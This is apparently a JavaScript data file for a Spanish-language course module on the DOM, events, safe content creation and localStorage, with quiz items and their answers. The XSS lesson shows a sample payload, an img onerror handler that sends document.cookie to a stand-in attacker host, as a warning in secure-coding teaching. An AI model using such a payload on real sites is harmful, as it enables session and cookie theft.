window.CURSOS = window.CURSOS || {};
(CURSOS.javascript = CURSOS.javascript || []).push({
titulo: "El DOM y los eventos",
resumen: "Seleccionar y modificar elementos, crear contenido de forma segura, eventos, delegación, formularios y almacenamiento local",
nivel: "Intermedio",
color: "#c5ab2a",
lecciones: [

{
id:"js7l1",
titulo:"Seleccionar y modificar elementos",
claves:["El DOM es el árbol de objetos que representa la página","querySelector y querySelectorAll con selectores CSS","textContent, classList, dataset y setAttribute para modificar"],
pasos:[
 {t:"info", eti:"La página como objetos", h:"¿Qué es el DOM?",
  c:`<p>Cuando el navegador lee el HTML, construye un árbol de objetos: el <b>DOM</b> (Document Object Model). JavaScript lee y modifica ese árbol, y el navegador redibuja la página.</p>
     <div class="termbox">const titulo = document.querySelector("h1");               // el primero que coincide
const botones = document.querySelectorAll(".btn");         // todos (NodeList)
const form = document.getElementById("registro");

titulo.textContent = "Bienvenido";          // cambiar el texto
titulo.classList.add("destacado");          // clases CSS
titulo.classList.toggle("oculto");
titulo.style.color = "tomato";              // estilo en linea
boton.setAttribute("aria-pressed", "true");
tarjeta.dataset.id;                          // lee data-id="42"</div>`},
 {t:"par", p:"Empareja cada propiedad o método con su uso",
  pares:[["querySelector(\".item\")","Primer elemento que coincide con el selector"],["querySelectorAll(\"li\")","Todos los elementos que coinciden"],["textContent","Leer o cambiar el texto (sin interpretar HTML)"],["classList.toggle(\"x\")","Poner o quitar una clase"],["dataset.id","Leer el atributo data-id"]],
  why:"Cambiar clases y dejar el aspecto al CSS es más limpio que tocar style directamente."},
 {t:"term", p:"En la consola del navegador, selecciona el primer elemento con la clase <code>precio</code>",
  prompt:">", sol:["document.querySelector(\".precio\")","document.querySelector('.precio')","document.querySelector(\".precio\");","document.querySelector('.precio');"],
  pista:"document.querySelector con el selector CSS de clase.",
  salida:`<span class="precio">24,90 €</span>`, why:"Los selectores son los mismos que en CSS: .clase, #id, etiqueta, [atributo]."},
 {t:"vf", p:"<code>querySelectorAll</code> devuelve un array con todos los métodos de Array.",
  ok:false, why:"Devuelve un NodeList: tiene forEach, pero no map ni filter. Conviértelo con [...lista] o Array.from."}
]},

{
id:"js7l2",
titulo:"Crear contenido de forma segura",
claves:["createElement y append para crear nodos","innerHTML con datos del usuario abre la puerta a XSS","textContent para texto; sanea si de verdad necesitas HTML"],
pasos:[
 {t:"info", eti:"Construir", h:"Crear elementos",
  c:`<div class="termbox">const li = document.createElement("li");
li.textContent = tarea.titulo;             // seguro: nunca se interpreta como HTML
li.className = "tarea";
lista.append(li);

lista.replaceChildren();                   // vaciar
li.remove();                               // quitar</div>`},
 {t:"info", eti:"Peligro", h:"XSS con innerHTML",
  c:`<div class="termbox">// un usuario pone como nombre:  &lt;img src=x onerror="fetch('https://malo.com?c=' + document.cookie)"&gt;
comentario.innerHTML = usuario.nombre;     // PELIGRO: se ejecuta el codigo del atacante
comentario.textContent = usuario.nombre;   // seguro: se muestra como texto</div>
     <p>El <b>Cross-Site Scripting</b> (XSS) permite ejecutar JavaScript ajeno en la página de otros usuarios: robar sesiones, hacer acciones en su nombre. Regla: <b>nunca metas datos de usuario en innerHTML</b>. Si necesitas HTML de usuario (un editor de texto enriquecido), sanéalo con una librería como DOMPurify. Frameworks como React escapan por defecto.</p>`},
 {t:"opcion", p:"Vas a mostrar el nombre que escribió un usuario dentro de un <code>&lt;span&gt;</code>. ¿Qué usas?",
  ops:["span.innerHTML = nombre","span.textContent = nombre","document.write(nombre)","eval(nombre)"],
  ok:1, why:"textContent nunca interpreta etiquetas: inmune a XSS."},
 {t:"par", p:"Empareja cada práctica con su nivel de riesgo",
  pares:[["textContent con datos del usuario","Seguro"],["innerHTML con datos del usuario","Vulnerable a XSS"],["innerHTML con HTML saneado por DOMPurify","Aceptable si es imprescindible"],["eval con datos externos","Nunca"]],
  why:"Una Content-Security-Policy estricta añade otra capa de defensa."},
 {t:"vf", p:"XSS solo es un problema si la aplicación maneja pagos.",
  ok:false, why:"Cualquier XSS permite actuar como la víctima: leer sus datos, cambiar su contraseña o publicar en su nombre."}
]},

{
id:"js7l3",
titulo:"Eventos",
claves:["addEventListener(tipo, manejador) reacciona a clics, teclas, envíos...","El objeto event da detalles: target, key, preventDefault()","Delegación: un solo manejador en el padre para muchos hijos"],
pasos:[
 {t:"info", eti:"Reaccionar", h:"addEventListener",
  c:`<div class="termbox">boton.addEventListener("click", (event) =&gt; {
  console.log("Pulsado", event.target);
});

campo.addEventListener("input", e =&gt; buscar(e.target.value));
document.addEventListener("keydown", e =&gt; { if (e.key === "Escape") cerrar(); });

formulario.addEventListener("submit", (e) =&gt; {
  e.preventDefault();                       // que no recargue la pagina
  const datos = new FormData(formulario);
  enviar(Object.fromEntries(datos));
});</div>`},
 {t:"info", eti:"Un manejador para todos", h:"Delegación de eventos",
  c:`<p>Los eventos <b>suben</b> (burbujeo) desde el elemento pulsado hasta el documento. Así puedes escuchar en el contenedor en vez de en cada elemento, incluso en los que se añadan después:</p>
     <div class="termbox">lista.addEventListener("click", (e) =&gt; {
  const boton = e.target.closest("button[data-borrar]");
  if (!boton) return;
  borrarTarea(boton.dataset.borrar);
});</div>`},
 {t:"par", p:"Empareja cada evento con cuándo se dispara",
  pares:[["click","Al pulsar un elemento"],["input","Cada vez que cambia el valor de un campo"],["submit","Al enviar un formulario"],["keydown","Al pulsar una tecla"],["DOMContentLoaded","Cuando el HTML está cargado y procesado"]],
  why:"Para formularios, escucha submit (funciona también con Enter), no el clic del botón."},
 {t:"opcion", p:"Tienes una lista con 1.000 filas y cada una un botón de borrar que se añaden dinámicamente. ¿Mejor enfoque?",
  ops:["Un listener en cada botón al crearlo","Un único listener en la lista usando delegación con e.target.closest","Recargar la página","Un setInterval que compruebe clics"],
  ok:1, why:"Menos memoria, y funciona automáticamente con las filas nuevas."},
 {t:"vf", p:"<code>event.preventDefault()</code> en un submit evita que el navegador recargue la página.",
  ok:true, why:"Imprescindible cuando envías el formulario con fetch."}
]},

{
id:"js7l4",
titulo:"Almacenamiento en el navegador",
claves:["localStorage guarda texto por origen y persiste; sessionStorage dura la pestaña","Guarda objetos con JSON.stringify y léelos con JSON.parse","Nunca guardes secretos: cualquier script de la página puede leerlo"],
pasos:[
 {t:"info", eti:"Recordar cosas", h:"localStorage",
  c:`<div class="termbox">localStorage.setItem("tema", "oscuro");
localStorage.getItem("tema");                  // "oscuro"
localStorage.setItem("carrito", JSON.stringify(carrito));
const carrito = JSON.parse(localStorage.getItem("carrito") ?? "[]");
localStorage.removeItem("tema");</div>
     <p>Solo guarda <b>texto</b>, unos 5 MB por origen, y es <b>síncrono</b>. Para mucho volumen o datos estructurados existe IndexedDB. Puede fallar (modo privado, almacenamiento bloqueado): envuélvelo en try/catch.</p>`},
 {t:"par", p:"Empareja cada mecanismo con su característica",
  pares:[["localStorage","Persiste entre sesiones; solo texto"],["sessionStorage","Se borra al cerrar la pestaña"],["Cookie HttpOnly","La envía el navegador al servidor y JavaScript no puede leerla"],["IndexedDB","Base de datos del navegador para mucho volumen"]],
  why:"Los tokens de sesión son más seguros en cookies HttpOnly que en localStorage, que un XSS puede leer."},
 {t:"opcion", p:"¿Qué devuelve <code>localStorage.getItem(\"x\")</code> si nunca guardaste nada con esa clave?",
  ops:["undefined","null","\"\"","Error"],
  ok:1, why:"Por eso el patrón JSON.parse(localStorage.getItem(k) ?? \"valorPorDefecto\")."},
 {t:"vf", p:"Guardar el número de la tarjeta del usuario en localStorage es seguro porque solo se ve en su navegador.",
  ok:false, why:"Cualquier script de la página (incluido uno inyectado por XSS o una dependencia comprometida) puede leerlo."}
]}

]});
